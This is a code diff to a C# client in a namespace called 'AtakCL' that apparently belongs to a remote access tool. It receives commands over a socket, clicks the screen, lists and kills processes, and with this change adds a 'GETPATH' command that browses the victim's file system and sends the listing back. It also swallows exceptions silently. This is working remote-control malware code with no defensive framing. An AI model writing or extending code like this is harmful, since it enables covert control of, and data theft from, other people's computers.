@@ -122,6 +122,10 @@ namespace AtakCL
                             Thread t6 = new Thread(() => clickScreen(sData[1], sData[2]));
                             t6.Start();
                             break;
+                        case "GETPATH":
+                            Thread t8 = new Thread(() => fileExplorer(sData[1]));
+                            t8.Start();
+                            break;
                         case "GETPRC":
                             Process[] processlist = Process.GetProcesses();
                             socket.Send(Encoding.UTF8.GetBytes("PPPNUM|" + processlist.Length));
@@ -358,14 +362,37 @@ namespace AtakCL
         }
         static void killProcess(string pid)
         {
-            Process[] process = Process.GetProcesses();
-            foreach (Process p in process)
+            try
             {
-                if (p.Id == Convert.ToInt32(pid))
+                Process[] process = Process.GetProcesses();
+                foreach (Process p in process)
                 {
-                    p.Kill();
-                    break;
+                    if (p.Id == Convert.ToInt32(pid))
+                    {
+                        p.Kill();
+                        break;
+                    }
                 }
+            }
+            catch (Exception)
+            {
+            }
+
+        }
+        static void fileExplorer(string path)
+        {
+            try
+            {
+                string fullDirec = string.Empty;
+                string[] allfiles = Directory.GetFileSystemEntries(path, "*", SearchOption.TopDirectoryOnly);
+                foreach (string name in allfiles)
+                {
+                    fullDirec += name + "|";
+                }
+                socket.Send(Encoding.UTF8.GetBytes("FILES|" + fullDirec));
+            }
+            catch (Exception)
+            {
             }
         }
 
